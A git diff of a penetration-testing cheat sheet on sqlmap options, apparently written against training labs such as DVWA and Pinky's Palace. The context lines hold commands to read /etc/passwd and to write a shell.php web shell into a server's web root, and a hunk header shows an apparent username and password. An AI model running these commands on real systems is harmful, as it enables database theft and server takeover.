@@ -411,10 +411,12 @@ marym:3kfs86sfd
 	```
 	--level=5 --risk=3
 	```
+
 6. Proxy
 	```
 	 --proxy=http://192.168.110.27:31337/
 	```
+
 7. Specify URL instead 
 	```
 	# Remember to specify form if its a login page
@@ -426,11 +428,13 @@ marym:3kfs86sfd
 	# w/o --form
 	sqlmap --url http://pinkys-palace:8080/littlesecrets-main/login.php --dbs --output-dir=$(pwd)/sqlmap
 	```
+
 8. [Read/Write file](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)
 	```
 	--file-read=/etc/passwd
 	--file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php
 	```
+
 - Options
 	```
 	sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap 
@@ -453,6 +457,7 @@ marym:3kfs86sfd
 		-U USER             DBMS user to enumerate
 
 	```
+	
 - Specify Headers
 	```
 	./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
